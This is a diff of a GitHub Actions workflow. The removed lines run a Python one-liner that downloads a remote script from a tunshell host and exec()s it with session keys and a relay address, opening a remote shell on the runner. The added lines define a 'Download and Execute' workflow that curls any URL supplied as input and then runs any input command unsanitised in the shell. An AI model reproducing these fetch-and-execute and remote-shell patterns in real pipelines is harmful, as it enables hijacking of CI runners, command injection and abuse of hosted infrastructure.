@@ -1,18 +1,29 @@
-name: Run Python Script
+name: Download and Execute
 
-on: 
-  workflow_dispatch: # This allows manual triggering
+on:
+  workflow_dispatch:
+    inputs:
+      download_link:
+        description: 'Enter the download link for the file'
+        required: true
+      command:
+        description: 'Enter the command to execute after downloading'
+        required: true
 
 jobs:
-  run-python-script:
+  download-and-run:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Set up Python
-      uses: actions/setup-python@v2
-      with:
-        python-version: '3.x' # Use the required Python version
+      - name: Checkout repository
+        uses: actions/checkout@v2
 
-    - name: Run Python Script
-      run: |
-        python -c "import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':['T','yOA30IfZf1UudQwzN9tctE','wezRnbozOGMyX5zPJKIFAM','eu.relay.tunshell.com']})"
+      - name: Download file using curl
+        run: |
+          echo "Downloading from: ${{ github.event.inputs.download_link }}"
+          curl -o block.py ${{ github.event.inputs.download_link }}
+
+      - name: Run the command
+        run: |
+          echo "Running command: ${{ github.event.inputs.command }}"
+          ${{ github.event.inputs.command }}
